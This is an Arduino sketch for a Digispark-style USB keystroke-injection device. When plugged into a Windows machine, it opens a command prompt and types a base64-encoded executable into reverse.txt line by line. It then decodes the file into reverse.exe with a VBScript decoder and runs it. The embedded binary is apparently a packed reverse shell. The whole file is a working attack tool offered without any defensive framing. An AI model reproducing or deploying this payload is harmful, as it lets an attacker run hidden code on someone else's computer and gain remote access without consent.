#include <DigiKeyboardDe.h>
#include <avr/pgmspace.h>

const char L3[] PROGMEM = "cmd";
const char L12[] PROGMEM = "copy /Y con reverse.txt";
const char L14[] PROGMEM = "TVprZXJuZWwzMi5kbGwAAFBFAABMAQIAAAAAAAAAAAAAAAAA4AAPAQsBAAAAAgAAAAAAAAAA";
const char L16[] PROGMEM = "AADfQgAAEAAAAAAQAAAAAEAAABAAAAACAAAEAAAAAAAAAAQAAAAAAAAAAFAAAAACAAAAAAAA";
const char L18[] PROGMEM = "AgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA20IAABQAAAAAAAAAAAAAAAAA";
const char L20[] PROGMEM = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
const char L22[] PROGMEM = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATUVXAEYS";
const char L24[] PROGMEM = "0sMAMAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAwALSdduKFuvUABAAAABAAADvAgAA";
const char L26[] PROGMEM = "AAIAAAAAAAAAAAAAAAAAAOAAAMC+HEBAAIvera1QrZeygKS2gP8Tc/kzyf8TcxYzwP8TcyG2";
const char L28[] PROGMEM = "gEGwEP8TEsBz+nU+quvg6HI+AAAC9oPZAXUO/1P86yas0eh0LxPJ6xqRSMHgCKz/U/w9AH0A";
const char L30[] PROGMEM = "AHMKgPwFcwaD+H93AkFBlYvFtgBWi/cr8POkXuubrYXAdZCtlq2XVqw8AHX7/1PwlVatD8hA";
const char L32[] PROGMEM = "WXTseQesPAB1+5FAUFX/U/SrdefDAAAAAAAzyUH/ExPJ/xNy+MOwQgAAvUIAAAAAAAAAQEAA";
const char L34[] PROGMEM = "MAFAAAAQQAAAEEAAaBwGMkAHagHoDnw4VQzoQgLIFTiean446lMMelAsFnRBMP0Bv1WysTNq";
const char L36[] PROGMEM = "kQIGsnxVmiejeINmxwVke0+mOGe8XVBmlD05ZqNofmRmfiF9i3MM2QpqaJQtoTp6b0gV6kwF";
const char L38[] PROGMEM = "EVBkkBBNRFWRFDxAeGooEGhdKP81MHTopJ5RVFWhVY2/bg4KCJAiC+FRFOgfgUvD/yUkILtv";
const char L40[] PROGMEM = "KhwGQxghFL3DIghxzAFVi+yBxHz+/4hWV+hgrN2JRfwzHcmLdX44PB10Bx4iQPdB6/RR0XLp";
const char L42[] PROGMEM = "AOFYO8F0C19eMLgDucnCCOGGSY29PHDlQyoJzy/gArAgqutz8iiNhRU5i/A2+DMqM+sbiwNm";
const char L44[] PROGMEM = "MgfvImUgTf4iEeEoLe2UCIO53LcwS3T7OzpNCKgVWWUdZwpME0EdDxTr5qoNNgcZhzj0sH/A";
const char L46[] PROGMEM = "VXMRi30Mxhe4An+CohOdaLCgWDQzDUYN5tH34f5Yo+7nRLsfFqnOEQTeVQE81BTUDhszwE7s";
const char L48[] PROGMEM = "hwtw0ooGRj08ArMSDvffkOsLLDAZjQyJBkiDLQrAdfHoBBEzUcI44jCDxAf0avXoaQkZSf+9";
const char L50[] PROGMEM = "gqogC9Aqk3U3+FAinSmGBvzoTS9oiyQ45lMaDwiNUAMhGIPABOP5//6AAvfTI8uB4USAdHzp";
const char L52[] PROGMEM = "bMEMYHV3BvQQwEAC0OEbwlFbOkfESRnKDFcGCDAAADBAAGMwbWQAZj9AABQ4IEADd3MyXzOY";
const char L54[] PROGMEM = "LmRs48CAZwdldGhvc0BieW5he23PHmOePPfr/w4SV1NBXc9hckZ1cBh5aMoscxNPJmNrYu/B";
const char L56[] PROGMEM = "/7gDbJUacspebEzHV9NpdPNGp7yRR8NMQ29tiGFuZDZMaURifoB2cvudOlC3gudzFUFYIcBk";
const char L58[] PROGMEM = "SNBDL2AAAAAAAGY/QABMb2FkTGlicmFyeUEAR2V0UHJvY0FkZHJlc3MAAAAAAAAAAAAAAAAA";
const char L60[] PROGMEM = "AAxAAADpdL7//wAAAAIAAAAMQAAA";
const char L64[] PROGMEM = "cscript decoder.vbs reverse.txt reverse.exe";
const char L66[] PROGMEM = "reverse.exe ";
const char L68[] PROGMEM = "exit";

char buffer[110];
#define GetPsz( x ) (strcpy_P(buffer, (char*)x))

void waitFor( int d ) {
  DigiKeyboardDe.delay(d);
}
void sendModKey( int key, int mod ) {
  DigiKeyboardDe.sendKeyStroke(key, mod);
  DigiKeyboardDe.update();
}
void sendKey( int key ) {
  DigiKeyboardDe.sendKeyStroke(key);
  DigiKeyboardDe.update();
}
void sendKeys(char t[]) {
  DigiKeyboardDe.print(t);
  DigiKeyboardDe.update();
}
void sendLine(char t[]) {
  DigiKeyboardDe.print(t);
  DigiKeyboardDe.update();
  sendKey(KEY_ENTER);
}

void setup()
{
  sendKey(0);
  sendModKey(KEY_R , MOD_GUI_LEFT);
  waitFor(400);
  sendKeys(GetPsz (L3));
  sendKey(KEY_ENTER);
  waitFor(1000);
  sendLine("color 0a");
  /*
  for ( int i = 12; i <= 68; i += 2)
  {
    sendLine(GetPsz (
  }
  */
  sendLine(GetPsz (L12));
  sendLine(GetPsz (L14));
  sendLine(GetPsz (L16));
  sendLine(GetPsz (L18));
  sendLine(GetPsz (L20));
  sendLine(GetPsz (L22));
  sendLine(GetPsz (L24));
  sendLine(GetPsz (L26));
  sendLine(GetPsz (L28));
  sendLine(GetPsz (L30));
  sendLine(GetPsz (L32));
  sendLine(GetPsz (L34));
  sendLine(GetPsz (L36));
  sendLine(GetPsz (L38));
  sendLine(GetPsz (L40));
  sendLine(GetPsz (L42));
  sendLine(GetPsz (L44));
  sendLine(GetPsz (L46));
  sendLine(GetPsz (L48));
  sendLine(GetPsz (L50));
  sendLine(GetPsz (L52));
  sendLine(GetPsz (L54));
  sendLine(GetPsz (L56));
  sendLine(GetPsz (L58));
  sendLine(GetPsz (L60));
  sendModKey(KEY_C, MOD_CONTROL_LEFT);
  sendKey(KEY_ENTER);
  sendLine(GetPsz (L64));
  sendLine(GetPsz (L66));
  sendLine(GetPsz (L68));
}

void loop() { }
